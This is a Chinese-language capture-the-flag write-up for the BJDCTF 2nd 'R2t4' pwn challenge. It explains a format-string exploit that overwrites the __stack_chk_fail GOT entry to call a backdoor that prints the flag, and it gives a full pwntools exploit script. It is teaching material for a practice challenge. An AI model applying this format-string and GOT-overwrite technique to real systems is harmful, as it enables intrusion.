---
title: "BJDCTF 2nd Pwn R2t4"
date: 2020-04-09T15:51:07+08:00
author: NiceSeven
categories:
  - BJDCTF 2nd
tags:
  - Pwn
---

# BJDCTF 2nd Pwn R2t4

考点:

1、格式化字符串漏洞修改任意地址内容

2、了解canary和\_\_stack_chk_fail的工作原理

![image-20200409163041232](/images/image-20200409163041232.png)

64位，开启Canary所以需要leak出canary或者改写\_\_stack_chk_fail等其他方法绕过

![image-20200409162115275](/images/image-20200409162115275.png)

![image-20200409162604327](/images/image-20200409162604327.png)

![image-20200409162647789](/images/image-20200409162647789.png)

存在后门（system("cat flag\")），存在canary且只可以溢出8字节的数据不够形成rop链，所以无法直接通过栈溢出来cat flag，但是存在格式化字符串漏洞，可以利用此漏洞修改任意地址的内容

利用格式化字符串漏洞需要知道我们的输入在栈中的偏移，才能使用$n来修改某个偏移位置的指针所指向地址的内容可以利用%p来测试

![image-20200409164740041](/images/image-20200409164740041.png)

这样我们就知道我们的第一个输入在栈中的偏移为6了，这样就可以构造格式化字符串来改写内容了，如下图栈偏移的9、10处覆盖为需要被修改内容的地址也就是指针，然后通过$n就能改写指针内容

（%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置）

![image-20200409162013690](/images/image-20200409162013690.png)

上下两图栈地址不一样是因为我分开调试的，地址随机化造成的，但是偏移量不变对理解思路无影响

![image-20200409171103613](/images/image-20200409171103613.png)

利用格式化字符串漏洞修改任意地址的漏洞，将__stack_chk_fail@got执行的函数地址修改为system("cat flag")的地址，然后故意覆盖cannry(rbp+8)使执行\_\_stack_chk_fail，这样在执行\_\_stack_chk_fail的时候实际是执行system("cat flag")

![image-20200409155353101](/images/image-20200409155353101.png)

system("cat flag\")的地址为0x00400626，因为是小端存储，所以我们需要将高字节写入高地址，低字节写入低地址，也是就将0x0040写入0x601018+2的地址，0x0626写入0x601018，这样系统再读0x601018的内容时也就识别为0x00400626，

![image-20200409161709981](/images/image-20200409161709981.png)这里exp使用的$hn表示是以2个字节写入，一次写入2字节，当然也可以选择一次写入4、8字节但是这样可能会导致程序崩溃，所以具体多少字节的写入要看具体情况（%$hhn表示写入的地址空间为1字节，$n表示写入的地址空间为4字节，%$lln表示写入的地址空间为8字节）

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./r2t4')
sh = remote('node3.buuoj.cn',28578)
elf = ELF('./r2t4')
#gdb.attach(sh)
__stack_chk_fail = elf.got['__stack_chk_fail']
print hex(__stack_chk_fail)
#%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置
#%c：输出字符，配上%n可用于向指定地址写数据
#这里payload的意思是将64以双字节(%hn)的形式赋给栈偏移为9的指针，将64+1510也是以双字节的形式赋给栈偏移为10的指针
#当然这里是使用16进制来赋值，64的16进制为0x0040，64+1510的16进制为0x0626
#最后两个p64是为了将栈偏移处覆盖为我们需要的修改的指针，如上图的栈内容
payload = '%64c%9$hn%1510c%10$hnAAA' + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)
#pause()
sh.sendline(payload)
sh.interactive()
```

![image-20200409162947159](/images/image-20200409162947159.png)

